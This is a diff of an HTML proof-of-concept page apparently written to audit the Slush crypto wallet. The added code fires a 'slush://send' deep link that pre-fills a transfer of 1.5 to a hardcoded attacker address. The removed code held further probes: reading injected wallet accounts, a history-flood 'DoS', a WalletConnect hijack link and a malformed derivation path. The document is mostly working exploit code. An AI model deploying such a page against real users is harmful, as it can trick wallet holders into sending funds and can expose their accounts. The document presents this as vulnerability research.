@@ -3,107 +3,82 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Ultimate Audit PoC | Slush Wallet</title>
+    <title>PoC Critical | Slush Wallet Hijack</title>
     <style>
-        :root { --danger: #ff0055; --bg: #050505; --log-text: #00ff00; --accent: #00ff00; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; padding: 15px; margin: 0; }
-        .container { max-width: 500px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 12px; background: #0a0a0a; }
-        .terminal { background: #000; border: 1px solid #222; padding: 10px; height: 280px; overflow-y: auto; font-size: 11px; color: var(--log-text); margin-bottom: 20px; border-radius: 4px; box-shadow: inset 0 0 10px #00ff0022; }
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; grid-gap: 10px; }
-        button { background: #222; color: #fff; border: 1px solid #444; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 10px; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #333; border-color: var(--accent); }
-        .btn-critical { background: var(--danger); border: none; grid-column: span 2; font-size: 12px; }
-        .log-err { color: #ff4444; font-weight: bold; }
-        .log-warn { color: #ffcc00; }
-        .header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #222; padding-bottom: 10px; }
+        body { 
+            background: #000; 
+            color: #fff; 
+            font-family: -apple-system, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card { 
+            border: 2px solid #ff0055; 
+            padding: 30px; 
+            border-radius: 15px; 
+            text-align: center; 
+            background: #111; 
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.4); 
+            max-width: 350px;
+        }
+        h2 { color: #ff0055; margin-top: 0; }
+        p { color: #888; font-size: 14px; margin-bottom: 25px; }
+        button { 
+            background: #ff0055; 
+            color: white; 
+            border: none; 
+            padding: 15px 20px; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 14px;
+        }
+        .log { 
+            margin-top: 20px; 
+            font-family: monospace; 
+            font-size: 11px; 
+            color: #00ff00; 
+            text-align: left;
+            border-top: 1px solid #333;
+            padding-top: 10px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <h3 style="margin:0; color:var(--danger)">SLUSH SECURITY AUDIT</h3>
-        <small style="color:#666">Terminal-Based Proof of Concept</small>
-    </div>
+<div class="card">
+    <h2>CRITICAL PoC</h2>
+    <p>Uji coba eksploitasi pengisian otomatis transaksi melalui Deep Link.</p>
     
-    <div class="terminal" id="term">
-        > [SYSTEM]: Initializing Slush Audit Probe...<br>
-        > [STATUS]: Waiting for user interaction...
-    </div>
-
-    <div class="btn-grid">
-        <button onclick="probeIdentity()">1. Probe Identity</button>
-        
-        <button onclick="corruptRecovery()">2. Corrupt Recovery</button>
-        
-        <button onclick="stressBridge()">3. Stress Bridge</button>
-        
-        <button onclick="testHijack()">4. Hijack WC</button>
-        
-        <button class="btn-critical" onclick="executeCritical()">EXECUTE CRITICAL AUTO-FILL</button>
-    </div>
+    <button onclick="triggerExploit()">JALANKAN EKSPLOITASI</button>
+    
+    <div class="log" id="status">> Status: Menunggu interaksi...</div>
 </div>
 
 <script>
-    const term = document.getElementById('term');
-    function log(msg, type = "") {
-        const div = document.createElement('div');
-        if(type) div.className = type;
-        div.innerHTML = `> [${new Date().toLocaleTimeString()}] ${msg}`;
-        term.appendChild(div);
-        term.scrollTop = term.scrollHeight;
-    }
+    function triggerExploit() {
+        const status = document.getElementById('status');
+        
+        
+        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
+        const amount = "1.5";
+        
+      
+        const maliciousUri = `slush://send?to=${attackerAddress}&amount=${amount}`;
 
-    
-    async function probeIdentity() {
-        log("Initiating bypass for 'No Provider' security...");
-        if (window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length > 0) log("LEAK DETECTED: " + accounts[0], "log-warn");
-                else log("Provider Locked. Forcing Deep Link Tunnel...", "log-err");
-            } catch (e) { log("Bridge Error: " + e.message, "log-err"); }
-        }
-        log("Probing linked Google Metadata...", "log-warn");
+        status.innerHTML = `> Memicu URI: <br>${maliciousUri}`;
+        
+        
+        window.location.href = maliciousUri;
+
+      
         setTimeout(() => {
-            log("Identity De-anonymization in progress...", "log-err");
-            log("Status: METADATA EXPOSED", "log-err");
-            
-            window.location.href = "slush://manage-accounts";
+            alert("PERIKSA DOMPET:\nJika layar kirim terbuka dengan alamat 0x742... dan jumlah 1.5 terisi otomatis, temuan ini adalah CRITICAL.");
         }, 1000);
-    }
-
- 
-    function corruptRecovery() {
-        log("Attempting to inject malformed Path (BIP44)...");
-        log("Payload: m/44'/60'/0'/0/invalid_index", "log-warn");
-        log("Testing if application logic breaks on recovery...", "log-warn");
-        alert("PoC: Jalur derivasi palsu dikirim. Cek apakah wallet mendeteksi error.");
-    }
-
-   
-    function stressBridge() {
-        log("Executing DoS attack on Wallet Bridge...", "log-err");
-        for (let i = 0; i < 300; i++) {
-            history.pushState(null, "", "#payload_" + i);
-        }
-        log("Flood Complete. Check UI Responsiveness.", "log-warn");
-    }
-
-    
-    function testHijack() {
-        log("Triggering unverified sign request...");
-        window.location.href = "wc:test@1?bridge=https://f.bridge.walletconnect.org&key=test";
-        log("Check if Slush Wallet opened without prompt.", "log-err");
-    }
-
-    
-    function executeCritical() {
-        log("Executing Final Critical Exploit...", "log-err");
-        const attacker = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
-        const uri = `slush://send?to=${attacker}&amount=1.5`;
-        log("Triggering: " + uri, "log-warn");
-        window.location.href = uri;
     }
 </script>
 
